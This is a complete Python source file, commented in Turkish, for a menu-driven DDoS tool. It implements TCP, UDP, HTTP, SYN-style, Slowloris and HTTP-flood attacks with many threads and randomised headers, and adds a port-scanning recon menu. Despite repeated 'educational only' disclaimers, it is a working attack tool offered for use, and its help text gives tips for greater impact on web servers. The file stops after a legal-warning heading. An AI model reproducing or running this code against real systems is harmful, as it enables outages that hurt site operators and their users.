#!/usr/bin/env python3
# -*- coding: utf-8 -*-

"""
DDoS Aracı V2 - Eğitim Amaçlıdır
Bu araç sadece eğitim amaçlıdır ve kötü niyetli kullanım için tasarlanmamıştır.
Başkalarının sistemlerine izinsiz saldırı yapmak yasalara aykırıdır.
"""

import socket
import threading
import random
import time
import sys
import os
import re
import ssl
import json
import argparse
from datetime import datetime
from queue import Queue
from urllib.parse import urlparse
from concurrent.futures import ThreadPoolExecutor

# Renkli çıktı için ANSI renk kodları
class Colors:
    GREEN = '\033[92m'
    YELLOW = '\033[93m'
    RED = '\033[91m'
    BLUE = '\033[94m'
    PURPLE = '\033[95m'
    CYAN = '\033[96m'
    ENDC = '\033[0m'
    BOLD = '\033[1m'

# Banner
def print_banner():
    banner = f"""
    {Colors.RED}{Colors.BOLD}
    ██████╗ ██████╗  ██████╗ ███████╗    ████████╗ ██████╗  ██████╗ ██╗     
    ██╔══██╗██╔══██╗██╔═══██╗██╔════╝    ╚══██╔══╝██╔═══██╗██╔═══██╗██║     
    ██║  ██║██║  ██║██║   ██║███████╗       ██║   ██║   ██║██║   ██║██║     
    ██║  ██║██║  ██║██║   ██║╚════██║       ██║   ██║   ██║██║   ██║██║     
    ██████╔╝██████╔╝╚██████╔╝███████║       ██║   ╚██████╔╝╚██████╔╝███████╗
    ╚═════╝ ╚═════╝  ╚═════╝ ╚══════╝       ╚═╝    ╚═════╝  ╚═════╝ ╚══════╝
    {Colors.ENDC}
    {Colors.CYAN}[+] Yapımcı: Fearmess & Pyth{Colors.ENDC}
    {Colors.CYAN}[+] Versiyon: 2.0 - Gelişmiş Sürüm{Colors.ENDC}
    {Colors.YELLOW}[!] Uyarı: Bu araç sadece eğitim amaçlıdır!{Colors.ENDC}
    {Colors.YELLOW}[!] Başkalarının sistemlerine izinsiz saldırı yapmak yasalara aykırıdır.{Colors.ENDC}
    """
    print(banner)

# Ekranı temizleme fonksiyonu
def clear_screen():
    os.system('cls' if os.name == 'nt' else 'clear')

# URL'den domain adını çıkarma
def extract_domain_from_url(url):
    try:
        # URL formatını kontrol et
        if not url.startswith(('http://', 'https://')):
            url = 'http://' + url
        
        # URL'yi ayrıştır
        parsed_url = urlparse(url)
        
        # Domain adını al
        domain = parsed_url.netloc
        
        # www. önekini kaldır
        if domain.startswith('www.'):
            domain = domain[4:]
            
        return domain
    except:
        return url

# Rastgele HTTP başlıkları oluşturma
def generate_random_headers(target):
    accept_encodings = ['gzip', 'deflate', 'br', 'gzip, deflate', 'gzip, deflate, br']
    accept_languages = ['en-US,en;q=0.9', 'en-GB,en;q=0.9', 'tr-TR,tr;q=0.9', 'de-DE,de;q=0.9', 'fr-FR,fr;q=0.9']
    caches = ['no-cache', 'max-age=0', 'no-store', 'must-revalidate']
    
    # Rastgele User-Agent listesi
    user_agents = [
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
        "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.107 Safari/537.36",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:90.0) Gecko/20100101 Firefox/90.0",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 11.5; rv:90.0) Gecko/20100101 Firefox/90.0",
        "Mozilla/5.0 (iPhone; CPU iPhone OS 14_7_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.2 Mobile/15E148 Safari/604.1",
        "Mozilla/5.0 (iPad; CPU OS 14_7_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.2 Mobile/15E148 Safari/604.1",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.107 Safari/537.36 Edg/92.0.902.55",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 11_5_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.107 Safari/537.36",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.107 Safari/537.36 OPR/78.0.4093.112",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Safari/537.36",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:96.0) Gecko/20100101 Firefox/96.0",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 12_1) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.2 Safari/605.1.15",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Safari/537.36 Edg/96.0.1054.62",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Safari/537.36 OPR/82.0.4227.50",
    ]
    
    # Rastgele referrer listesi
    referrers = [
        "https://www.google.com/",
        "https://www.bing.com/",
        "https://www.yahoo.com/",
        "https://www.facebook.com/",
        "https://www.twitter.com/",
        "https://www.instagram.com/",
        "https://www.linkedin.com/",
        "https://www.reddit.com/",
        f"https://{target}/",
        "https://www.youtube.com/",
    ]
    
    headers = {
        "Host": target,
        "User-Agent": random.choice(user_agents),
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
        "Accept-Encoding": random.choice(accept_encodings),
        "Accept-Language": random.choice(accept_languages),
        "Cache-Control": random.choice(caches),
        "Connection": "keep-alive",
        "Upgrade-Insecure-Requests": "1",
    }
    
    # Rastgele referrer ekle
    if random.random() > 0.5:
        headers["Referer"] = random.choice(referrers)
    
    # Rastgele DNT (Do Not Track) ekle
    if random.random() > 0.7:
        headers["DNT"] = "1"
    
    # Rastgele Pragma ekle
    if random.random() > 0.8:
        headers["Pragma"] = "no-cache"
    
    return headers

# HTTP isteği oluşturma
def create_http_request(target, method="GET", path="/", headers=None, data=None):
    if headers is None:
        headers = generate_random_headers(target)
    
    request = f"{method} {path} HTTP/1.1\r\n"
    
    for header, value in headers.items():
        request += f"{header}: {value}\r\n"
    
    request += "\r\n"
    
    if data:
        request += data
    
    return request.encode()

# Saldırı sınıfı
class DDoSAttack:
    def __init__(self, target, port, attack_type="HTTP", threads=100, duration=30, use_ssl=False, path="/", intensity=1):
        self.target = target
        self.port = port
        self.attack_type = attack_type.upper()
        self.threads = threads
        self.duration = duration
        self.is_running = True
        self.counter = 0
        self.start_time = None
        self.q = Queue()
        self.use_ssl = use_ssl
        self.path = path
        self.intensity = min(max(intensity, 1), 10)  # 1-10 arası
        self.lock = threading.Lock()
        
        # Rastgele veri oluştur
        self.random_data = os.urandom(1024 * self.intensity)
        
        # HTTP POST için rastgele form verileri
        self.form_data = {
            "username": "user" + str(random.randint(1000, 9999)),
            "password": "pass" + str(random.randint(1000, 9999)),
            "email": f"user{random.randint(1000, 9999)}@example.com",
            "comment": "This is a test comment " + "A" * (50 * self.intensity),
            "submit": "Submit"
        }
        
    def _tcp_attack(self):
        while self.is_running:
            try:
                for _ in range(self.intensity):
                    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    s.settimeout(1)
                    s.connect((self.target, self.port))
                    
                    if self.use_ssl:
                        s = ssl.wrap_socket(s)
                    
                    s.send(self.random_data)
                    with self.lock:
                        self.counter += 1
                    s.close()
            except:
                pass
    
    def _udp_attack(self):
        while self.is_running:
            try:
                for _ in range(self.intensity):
                    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                    s.connect((self.target, self.port))
                    s.send(self.random_data)
                    with self.lock:
                        self.counter += 1
                    s.close()
            except:
                pass
    
    def _http_attack(self):
        while self.is_running:
            try:
                for _ in range(self.intensity):
                    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    s.settimeout(1)
                    s.connect((self.target, self.port))
                    
                    if self.use_ssl:
                        context = ssl.create_default_context()
                        context.check_hostname = False
                        context.verify_mode = ssl.CERT_NONE
                        s = context.wrap_socket(s, server_hostname=self.target)
                    
                    # Rastgele HTTP metodu seç
                    method = random.choice(["GET", "POST", "HEAD"]) if random.random() > 0.7 else "GET"
                    
                    # Rastgele yol oluştur
                    random_path = self.path
                    if random.random() > 0.7:
                        random_path = f"{self.path}?id={random.randint(1, 1000)}&page={random.randint(1, 100)}"
                    
                    # HTTP isteği oluştur
                    headers = generate_random_headers(self.target)
                    
                    if method == "POST":
                        post_data = "&".join([f"{k}={v}" for k, v in self.form_data.items()])
                        headers["Content-Type"] = "application/x-www-form-urlencoded"
                        headers["Content-Length"] = str(len(post_data))
                        request = create_http_request(self.target, method, random_path, headers, post_data)
                    else:
                        request = create_http_request(self.target, method, random_path, headers)
                    
                    s.send(request)
                    with self.lock:
                        self.counter += 1
                    s.close()
            except:
                pass
    
    def _syn_attack(self):
        # Not: SYN saldırısı için raw socket gereklidir ve yüksek izin gerektirir
        # Bu basit bir simülasyondur
        while self.is_running:
            try:
                for _ in range(self.intensity):
                    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    s.settimeout(0.5)
                    s.connect((self.target, self.port))
                    s.close()
                    with self.lock:
                        self.counter += 1
            except:
                pass
    
    def _slowloris_attack(self):
        # Slowloris saldırısı - Bağlantıları açık tutar ve yavaş yavaş veri gönderir
        sockets_list = []
        
        # Bağlantıları oluştur
        for _ in range(min(500, self.threads)):
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.settimeout(4)
                s.connect((self.target, self.port))
                
                if self.use_ssl:
                    context = ssl.create_default_context()
                    context.check_hostname = False
                    context.verify_mode = ssl.CERT_NONE
                    s = context.wrap_socket(s, server_hostname=self.target)
                
                # HTTP isteği başlat ama tamamlama
                s.send(f"GET {self.path} HTTP/1.1\r\n".encode())
                s.send(f"Host: {self.target}\r\n".encode())
                s.send("User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36\r\n".encode())
                
                sockets_list.append(s)
                with self.lock:
                    self.counter += 1
            except:
                pass
        
        # Bağlantıları açık tut
        while self.is_running:
            for s in list(sockets_list):
                try:
                    # Rastgele başlık gönder
                    header = f"X-a: {random.randint(1, 5000)}\r\n"
                    s.send(header.encode())
                    with self.lock:
                        self.counter += 1
                except:
                    sockets_list.remove(s)
                    try:
                        # Yeni soket oluştur
                        new_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                        new_socket.settimeout(4)
                        new_socket.connect((self.target, self.port))
                        
                        if self.use_ssl:
                            context = ssl.create_default_context()
                            context.check_hostname = False
                            context.verify_mode = ssl.CERT_NONE
                            new_socket = context.wrap_socket(new_socket, server_hostname=self.target)
                        
                        new_socket.send(f"GET {self.path} HTTP/1.1\r\n".encode())
                        new_socket.send(f"Host: {self.target}\r\n".encode())
                        new_socket.send("User-Agent: Mozilla/5.0\r\n".encode())
                        
                        sockets_list.append(new_socket)
                        with self.lock:
                            self.counter += 1
                    except:
                        pass
            
            time.sleep(1)
    
    def _http_flood_attack(self):
        # HTTP Flood - Çok sayıda HTTP isteği gönderir
        while self.is_running:
            try:
                for _ in range(self.intensity * 2):  # Daha yoğun
                    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    s.settimeout(1)
                    s.connect((self.target, self.port))
                    
                    if self.use_ssl:
                        context = ssl.create_default_context()
                        context.check_hostname = False
                        context.verify_mode = ssl.CERT_NONE
                        s = context.wrap_socket(s, server_hostname=self.target)
                    
                    # Rastgele yol ve sorgu parametreleri
                    timestamp = int(time.time())
                    random_path = f"{self.path}?id={random.randint(1, 10000)}&t={timestamp}&nocache={random.random()}"
                    
                    # HTTP isteği oluştur
                    request = create_http_request(self.target, "GET", random_path, generate_random_headers(self.target))
                    
                    s.send(request)
                    with self.lock:
                        self.counter += 1
                    s.close()
            except:
                pass
    
    def _worker(self):
        attack_type = self.q.get()
        if attack_type == "TCP":
            self._tcp_attack()
        elif attack_type == "UDP":
            self._udp_attack()
        elif attack_type == "HTTP":
            self._http_attack()
        elif attack_type == "SYN":
            self._syn_attack()
        elif attack_type == "SLOWLORIS":
            self._slowloris_attack()
        elif attack_type == "HTTP-FLOOD":
            self._http_flood_attack()
        self.q.task_done()
    
    def start(self):
        self.start_time = time.time()
        
        # Saldırı türüne göre kuyruk oluştur
        for _ in range(self.threads):
            self.q.put(self.attack_type)
        
        # İş parçacıklarını başlat
        for _ in range(self.threads):
            t = threading.Thread(target=self._worker)
            t.daemon = True
            t.start()
        
        # İlerleme göster
        print(f"{Colors.GREEN}[+] Saldırı başlatıldı: {self.target}:{self.port} ({self.attack_type}){Colors.ENDC}")
        print(f"{Colors.YELLOW}[*] {self.threads} iş parçacığı ile {self.duration} saniye boyunca çalışacak{Colors.ENDC}")
        print(f"{Colors.YELLOW}[*] Yoğunluk seviyesi: {self.intensity}/10{Colors.ENDC}")
        
        if self.use_ssl:
            print(f"{Colors.YELLOW}[*] SSL/TLS kullanılıyor{Colors.ENDC}")
        
        # Saldırı süresi boyunca istatistikleri göster
        end_time = time.time() + self.duration
        while time.time() < end_time and self.is_running:
            elapsed = time.time() - self.start_time
            packets_per_second = self.counter / elapsed if elapsed > 0 else 0
            remaining = end_time - time.time()
            
            # İlerleme çubuğu
            progress = int((elapsed / self.duration) * 30)
            bar = "[" + "=" * progress + " " * (30 - progress) + "]"
            
            # İstatistikleri yazdır
            sys.stdout.write(f"\r{Colors.CYAN}[*] {bar} {int(elapsed)}s/{self.duration}s | Paket: {self.counter} | Hız: {packets_per_second:.2f} p/s | Kalan: {int(remaining)}s{Colors.ENDC}")
            sys.stdout.flush()
            time.sleep(1)
        
        # Saldırıyı durdur
        self.is_running = False
        
        # Sonuçları göster
        elapsed = time.time() - self.start_time
        packets_per_second = self.counter / elapsed if elapsed > 0 else 0
        print(f"\n{Colors.GREEN}[+] Saldırı tamamlandı!{Colors.ENDC}")
        print(f"{Colors.BLUE}[*] Toplam paket: {self.counter}{Colors.ENDC}")
        print(f"{Colors.BLUE}[*] Ortalama hız: {packets_per_second:.2f} paket/saniye{Colors.ENDC}")
        print(f"{Colors.BLUE}[*] Süre: {elapsed:.2f} saniye{Colors.ENDC}")
    
    def stop(self):
        self.is_running = False
        print(f"\n{Colors.YELLOW}[!] Saldırı durduruldu!{Colors.ENDC}")

# Ana menü
def main_menu():
    clear_screen()
    print_banner()
    
    while True:
        print(f"\n{Colors.CYAN}{Colors.BOLD}=== ANA MENÜ ==={Colors.ENDC}")
        print(f"{Colors.BLUE}[1] DDoS Saldırısı Başlat{Colors.ENDC}")
        print(f"{Colors.BLUE}[2] Hedef Hakkında Bilgi Topla{Colors.ENDC}")
        print(f"{Colors.BLUE}[3] Yardım{Colors.ENDC}")
        print(f"{Colors.BLUE}[4] Çıkış{Colors.ENDC}")
        
        choice = input(f"\n{Colors.YELLOW}[?] Seçiminiz: {Colors.ENDC}")
        
        if choice == "1":
            attack_menu()
        elif choice == "2":
            info_gathering_menu()
        elif choice == "3":
            help_menu()
        elif choice == "4":
            print(f"\n{Colors.GREEN}[+] Programdan çıkılıyor...{Colors.ENDC}")
            sys.exit(0)
        else:
            print(f"\n{Colors.RED}[!] Geçersiz seçim!{Colors.ENDC}")
            time.sleep(1)

# Saldırı menüsü
def attack_menu():
    clear_screen()
    print_banner()
    print(f"\n{Colors.CYAN}{Colors.BOLD}=== SALDIRI MENÜSÜ ==={Colors.ENDC}")
    
    # Hedef bilgilerini al
    target_input = input(f"{Colors.YELLOW}[?] Hedef IP/Domain: {Colors.ENDC}")
    
    # URL ise domain adını çıkar
    if '/' in target_input or ':' in target_input:
        print(f"{Colors.YELLOW}[*] URL algılandı, domain adı çıkarılıyor...{Colors.ENDC}")
        target = extract_domain_from_url(target_input)
        print(f"{Colors.YELLOW}[*] Çıkarılan domain: {target}{Colors.ENDC}")
    else:
        target = target_input
    
    # Hedef IP çözümle
    try:
        target_ip = socket.gethostbyname(target)
        print(f"{Colors.GREEN}[+] Hedef IP: {target_ip}{Colors.ENDC}")
    except:
        print(f"{Colors.RED}[!] Hedef çözümlenemedi!{Colors.ENDC}")
        print(f"{Colors.YELLOW}[*] İpucu: Tam URL yerine sadece domain adını girin (örn: 'example.com'){Colors.ENDC}")
        time.sleep(3)
        return
    
    # SSL/TLS kullanımını sor
    use_ssl = input(f"{Colors.YELLOW}[?] SSL/TLS kullanılsın mı? (e/h) [h]: {Colors.ENDC}").lower() == 'e'
    
    # Varsayılan port belirle
    default_port = 443 if use_ssl else 80
    
    # Port bilgisini al
    try:
        port_input = input(f"{Colors.YELLOW}[?] Hedef Port [{default_port}]: {Colors.ENDC}")
        if port_input.strip() == "":
            port = default_port
            print(f"{Colors.YELLOW}[*] Varsayılan port ({default_port}) kullanılıyor{Colors.ENDC}")
        else:
            port = int(port_input)
            if port < 1 or port > 65535:
                raise ValueError
    except:
        print(f"{Colors.RED}[!] Geçersiz port numarası! Varsayılan port ({default_port}) kullanılıyor.{Colors.ENDC}")
        port = default_port
        time.sleep(1)
    
    # Yol bilgisini al (HTTP saldırıları için)
    path_input = input(f"{Colors.YELLOW}[?] Hedef Yol [/]: {Colors.ENDC}")
    path = path_input if path_input.strip() != "" else "/"
    
    # Saldırı türünü seç
    print(f"\n{Colors.BLUE}Saldırı Türleri:{Colors.ENDC}")
    print(f"{Colors.BLUE}[1] TCP Flood{Colors.ENDC}")
    print(f"{Colors.BLUE}[2] UDP Flood{Colors.ENDC}")
    print(f"{Colors.BLUE}[3] HTTP Flood (Web sunucuları için önerilir){Colors.ENDC}")
    print(f"{Colors.BLUE}[4] SYN Flood (Yüksek izin gerektirir){Colors.ENDC}")
    print(f"{Colors.BLUE}[5] Slowloris (Yavaş HTTP saldırısı){Colors.ENDC}")
    print(f"{Colors.BLUE}[6] HTTP-FLOOD (Gelişmiş HTTP saldırısı){Colors.ENDC}")
    
    attack_choice = input(f"\n{Colors.YELLOW}[?] Saldırı türü seçin [3]: {Colors.ENDC}")
    
    if attack_choice == "1":
        attack_type = "TCP"
    elif attack_choice == "2":
        attack_type = "UDP"
    elif attack_choice == "3" or attack_choice.strip() == "":
        attack_type = "HTTP"
        if attack_choice.strip() == "":
            print(f"{Colors.YELLOW}[*] Varsayılan saldırı türü (HTTP) kullanılıyor{Colors.ENDC}")
    elif attack_choice == "4":
        attack_type = "SYN"
    elif attack_choice == "5":
        attack_type = "SLOWLORIS"
    elif attack_choice == "6":
        attack_type = "HTTP-FLOOD"
    else:
        print(f"{Colors.RED}[!] Geçersiz seçim! Varsayılan olarak HTTP kullanılacak.{Colors.ENDC}")
        attack_type = "HTTP"
    
    # İş parçacığı sayısını al
    try:
        threads_input = input(f"{Colors.YELLOW}[?] İş parçacığı sayısı [1000]: {Colors.ENDC}")
        if threads_input.strip() == "":
            threads = 1000
        else:
            threads = int(threads_input)
            if threads < 1:
                raise ValueError
    except:
        print(f"{Colors.RED}[!] Geçersiz değer! Varsayılan olarak 1000 kullanılacak.{Colors.ENDC}")
        threads = 1000
    
    # Saldırı süresini al
    try:
        duration_input = input(f"{Colors.YELLOW}[?] Saldırı süresi (saniye) [60]: {Colors.ENDC}")
        if duration_input.strip() == "":
            duration = 60
        else:
            duration = int(duration_input)
            if duration < 1:
                raise ValueError
    except:
        print(f"{Colors.RED}[!] Geçersiz değer! Varsayılan olarak 60 saniye kullanılacak.{Colors.ENDC}")
        duration = 60
    
    # Yoğunluk seviyesini al
    try:
        intensity_input = input(f"{Colors.YELLOW}[?] Yoğunluk seviyesi (1-10) [5]: {Colors.ENDC}")
        if intensity_input.strip() == "":
            intensity = 5
        else:
            intensity = int(intensity_input)
            if intensity < 1 or intensity > 10:
                raise ValueError
    except:
        print(f"{Colors.RED}[!] Geçersiz değer! Varsayılan olarak 5 kullanılacak.{Colors.ENDC}")
        intensity = 5
    
    # Onay al
    print(f"\n{Colors.YELLOW}[!] UYARI: Bu işlem ağ trafiği oluşturacak ve hedef sisteme yük bindirecektir.{Colors.ENDC}")
    print(f"{Colors.YELLOW}[!] Sadece test amaçlı ve izin verilen sistemlerde kullanın!{Colors.ENDC}")
    confirm = input(f"{Colors.RED}[?] Devam etmek istiyor musunuz? (e/h): {Colors.ENDC}")
    
    if confirm.lower() != "e":
        print(f"{Colors.GREEN}[+] İşlem iptal edildi.{Colors.ENDC}")
        time.sleep(2)
        return
    
    # Saldırıyı başlat
    clear_screen()
    print_banner()
    print(f"\n{Colors.CYAN}{Colors.BOLD}=== SALDIRI BAŞLATILIYOR ==={Colors.ENDC}")
    print(f"{Colors.BLUE}[*] Hedef: {target} ({target_ip}){Colors.ENDC}")
    print(f"{Colors.BLUE}[*] Port: {port}{Colors.ENDC}")
    print(f"{Colors.BLUE}[*] Yol: {path}{Colors.ENDC}")
    print(f"{Colors.BLUE}[*] Saldırı Türü: {attack_type}{Colors.ENDC}")
    print(f"{Colors.BLUE}[*] İş Parçacığı: {threads}{Colors.ENDC}")
    print(f"{Colors.BLUE}[*] Süre: {duration} saniye{Colors.ENDC}")
    print(f"{Colors.BLUE}[*] Yoğunluk: {intensity}/10{Colors.ENDC}")
    
    if use_ssl:
        print(f"{Colors.BLUE}[*] SSL/TLS: Aktif{Colors.ENDC}")
    
    # Saldırı nesnesini oluştur ve başlat
    attack = DDoSAttack(
        target_ip, 
        port, 
        attack_type, 
        threads, 
        duration, 
        use_ssl, 
        path, 
        intensity
    )
    
    try:
        attack.start()
    except KeyboardInterrupt:
        attack.stop()
    
    input(f"\n{Colors.GREEN}[+] Ana menüye dönmek için ENTER tuşuna basın...{Colors.ENDC}")

# Bilgi toplama menüsü
def info_gathering_menu():
    clear_screen()
    print_banner()
    print(f"\n{Colors.CYAN}{Colors.BOLD}=== BİLGİ TOPLAMA MENÜSÜ ==={Colors.ENDC}")
    
    target_input = input(f"{Colors.YELLOW}[?] Hedef IP/Domain: {Colors.ENDC}")
    
    # URL ise domain adını çıkar
    if '/' in target_input or ':' in target_input:
        print(f"{Colors.YELLOW}[*] URL algılandı, domain adı çıkarılıyor...{Colors.ENDC}")
        target = extract_domain_from_url(target_input)
        print(f"{Colors.YELLOW}[*] Çıkarılan domain: {target}{Colors.ENDC}")
    else:
        target = target_input
    
    print(f"\n{Colors.BLUE}[*] Hedef hakkında bilgi toplanıyor: {target}{Colors.ENDC}")
    
    # IP adresi çözümleme
    try:
        ip = socket.gethostbyname(target)
        print(f"{Colors.GREEN}[+] IP Adresi: {ip}{Colors.ENDC}")
        
        # Ters DNS sorgusu
        try:
            hostname, _, _ = socket.gethostbyaddr(ip)
            print(f"{Colors.GREEN}[+] Hostname: {hostname}{Colors.ENDC}")
        except:
            print(f"{Colors.YELLOW}[!] Hostname bulunamadı.{Colors.ENDC}")
    except:
        print(f"{Colors.RED}[!] IP adresi çözümlenemedi!{Colors.ENDC}")
        print(f"{Colors.YELLOW}[*] İpucu: Tam URL yerine sadece domain adını girin (örn: 'example.com'){Colors.ENDC}")
        time.sleep(3)
        return
    
    # HTTP/HTTPS kontrolü
    print(f"\n{Colors.BLUE}[*] HTTP/HTTPS erişimi kontrol ediliyor...{Colors.ENDC}")
    
    http_status = "Kapalı"
    https_status = "Kapalı"
    
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(2)
        result = s.connect_ex((ip, 80))
        if result == 0:
            http_status = "Açık"
        s.close()
    except:
        pass
    
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(2)
        result = s.connect_ex((ip, 443))
        if result == 0:
            https_status = "Açık"
        s.close()
    except:
        pass
    
    print(f"{Colors.GREEN}[+] HTTP (Port 80): {http_status}{Colors.ENDC}")
    print(f"{Colors.GREEN}[+] HTTPS (Port 443): {https_status}{Colors.ENDC}")
    
    # Açık portları tarama (basit)
    print(f"\n{Colors.BLUE}[*] Yaygın portlar taranıyor...{Colors.ENDC}")
    common_ports = [21, 22, 23, 25, 53, 80, 110, 135, 139, 143, 443, 445, 993, 995, 1433, 3306, 3389, 5900, 8080, 8443]
    
    open_ports = []
    
    # İlerleme çubuğu
    total_ports = len(common_ports)
    for i, port in enumerate(common_ports):
        # İlerleme göster
        progress = int((i / total_ports) * 30)
        bar = "[" + "=" * progress + " " * (30 - progress) + "]"
        sys.stdout.write(f"\r{Colors.CYAN}[*] Taranıyor: {bar} {i+1}/{total_ports} - Port {port}{Colors.ENDC}")
        sys.stdout.flush()
        
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(0.5)
            result = s.connect_ex((ip, port))
            if result == 0:
                open_ports.append(port)
            s.close()
        except:
            pass
    
    print("\n")  # İlerleme çubuğundan sonra yeni satır
    
    if open_ports:
        print(f"{Colors.GREEN}[+] Açık portlar:{Colors.ENDC}")
        for port in open_ports:
            service = get_service_name(port)
            print(f"{Colors.GREEN}    - Port {port}: {service}{Colors.ENDC}")
    else:
        print(f"{Colors.YELLOW}[!] Açık port bulunamadı.{Colors.ENDC}")
    
    # HTTP başlık bilgisi (basit)
    if http_status == "Açık" or https_status == "Açık":
        print(f"\n{Colors.BLUE}[*] HTTP başlık bilgisi alınıyor...{Colors.ENDC}")
        
        try:
            protocol = "https" if https_status == "Açık" else "http"
            port_str = "" if (protocol == "http" and port == 80) or (protocol == "https" and port == 443) else f":{port}"
            
            import http.client
            
            if protocol == "https":
                conn = http.client.HTTPSConnection(target, timeout=5)
            else:
                conn = http.client.HTTPConnection(target, timeout=5)
            
            conn.request("HEAD", "/")
            response = conn.getresponse()
            
            print(f"{Colors.GREEN}[+] Durum: {response.status} {response.reason}{Colors.ENDC}")
            
            for header, value in response.getheaders():
                print(f"{Colors.GREEN}    - {header}: {value}{Colors.ENDC}")
            
            conn.close()
        except:
            print(f"{Colors.RED}[!] HTTP başlık bilgisi alınamadı.{Colors.ENDC}")
    
    input(f"\n{Colors.GREEN}[+] Ana menüye dönmek için ENTER tuşuna basın...{Colors.ENDC}")

# Port numarasına göre servis adı döndürme
def get_service_name(port):
    services = {
        21: "FTP",
        22: "SSH",
        23: "Telnet",
        25: "SMTP",
        53: "DNS",
        80: "HTTP",
        110: "POP3",
        135: "MSRPC",
        139: "NetBIOS",
        143: "IMAP",
        443: "HTTPS",
        445: "SMB",
        993: "IMAPS",
        995: "POP3S",
        1433: "MSSQL",
        3306: "MySQL",
        3389: "RDP",
        5900: "VNC",
        8080: "HTTP-Proxy",
        8443: "HTTPS-Alt"
    }
    
    return services.get(port, "Bilinmeyen")

# Yardım menüsü
def help_menu():
    clear_screen()
    print_banner()
    print(f"\n{Colors.CYAN}{Colors.BOLD}=== YARDIM MENÜSÜ ==={Colors.ENDC}")
    
    print(f"{Colors.BLUE}Bu program, DDoS saldırılarının nasıl çalıştığını anlamak için tasarlanmış eğitim amaçlı bir araçtır.{Colors.ENDC}")
    print(f"{Colors.BLUE}Gerçek sistemlere izinsiz saldırı yapmak yasalara aykırıdır ve ciddi sonuçlar doğurabilir.{Colors.ENDC}")
    
    print(f"\n{Colors.YELLOW}Saldırı Türleri:{Colors.ENDC}")
    print(f"{Colors.CYAN}1. TCP Flood: TCP bağlantıları oluşturarak hedef sistemi meşgul eder.{Colors.ENDC}")
    print(f"{Colors.CYAN}2. UDP Flood: UDP paketleri göndererek bant genişliğini tüketir.{Colors.ENDC}")
    print(f"{Colors.CYAN}3. HTTP Flood: HTTP istekleri göndererek web sunucusunu meşgul eder.{Colors.ENDC}")
    print(f"{Colors.CYAN}4. SYN Flood: TCP SYN paketleri göndererek bağlantı havuzunu tüketir.{Colors.ENDC}")
    print(f"{Colors.CYAN}5. Slowloris: Yavaş ve uzun süreli HTTP bağlantıları oluşturarak web sunucusunu meşgul eder.{Colors.ENDC}")
    print(f"{Colors.CYAN}6. HTTP-FLOOD: Gelişmiş HTTP saldırısı, rastgele parametreler ve başlıklarla yoğun istek gönderir.{Colors.ENDC}")
    
    print(f"\n{Colors.YELLOW}Yeni Özellikler (v2.0):{Colors.ENDC}")
    print(f"{Colors.CYAN}1. Gelişmiş HTTP saldırıları: Rastgele başlıklar, yollar ve parametrelerle daha etkili.{Colors.ENDC}")
    print(f"{Colors.CYAN}2. SSL/TLS desteği: HTTPS sitelerine saldırı yapabilme.{Colors.ENDC}")
    print(f"{Colors.CYAN}3. Slowloris saldırısı: Web sunucularına karşı etkili bir yöntem.{Colors.ENDC}")
    print(f"{Colors.CYAN}4. Yoğunluk seviyesi: Saldırı gücünü ayarlama imkanı.{Colors.ENDC}")
    print(f"{Colors.CYAN}5. Gelişmiş bilgi toplama: Daha detaylı hedef analizi.{Colors.ENDC}")
    
    print(f"\n{Colors.YELLOW}Kullanım İpuçları:{Colors.ENDC}")
    print(f"{Colors.CYAN}1. Hedef olarak tam URL yerine sadece domain adını girin (örn: 'example.com').{Colors.ENDC}")
    print(f"{Colors.CYAN}2. Web sunucularına saldırı için HTTP Flood veya Slowloris türünü kullanın.{Colors.ENDC}")
    print(f"{Colors.CYAN}3. HTTPS siteleri için SSL/TLS seçeneğini aktifleştirin ve port 443'ü kullanın.{Colors.ENDC}")
    print(f"{Colors.CYAN}4. Daha yüksek iş parçacığı sayısı ve yoğunluk seviyesi daha fazla etki yaratır.{Colors.ENDC}")
    print(f"{Colors.CYAN}5. Saldırıyı durdurmak için CTRL+C tuşlarına basın.{Colors.ENDC}")
    
    print(f"\n{Colors.YELLOW}Yasal Uyarı:{Colors.ENDC}")
